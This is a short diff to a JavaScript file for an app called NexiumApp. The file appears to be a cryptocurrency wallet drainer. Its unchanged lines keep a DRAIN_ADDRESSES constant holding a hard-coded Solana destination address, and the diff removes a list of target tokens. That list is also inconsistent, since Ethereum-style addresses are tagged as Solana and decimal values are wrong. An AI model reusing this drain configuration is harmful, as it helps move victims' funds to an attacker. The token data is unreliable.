@@ -9,17 +9,6 @@ const DRAIN_ADDRESSES = {
   solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
 };
 
-const TOKEN_LIST = [
-  { address: "So11111111111111111111111111111111111111112", name: 'Solana', symbol: 'SOL', decimals: 9, isNative: true, chain: 'solana' },
-  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' },
-  { address: '0x0d505C03d30e65f6e4bC25069FCf067B3f621770', name: 'BNB', symbol: 'BNB', decimals: 6, isNative: false, chain: 'solana' },
-  { address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', name: 'MATIC', symbol: 'MATIC', decimals: 6, isNative: false, chain: 'solana' },
-  { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', name: 'ETH', symbol: 'ETH', decimals: 6, isNative: false, chain: 'solana' },
-  { address: '0x4200000000000000000000000000000000000006', name: 'BASE ETH', symbol: 'BASE ETH', decimals: 6, isNative: false, chain: 'solana' },
-  { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', name: 'LINK', symbol: 'LINK', decimals: 6, isNative: false, chain: 'solana' },
-  { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Wrapped SOL', symbol: 'wSOL', decimals: 9, isNative: false, chain: 'solana' }
-];
-
 class NexiumApp {
   constructor() {
     this.publicKey = null;
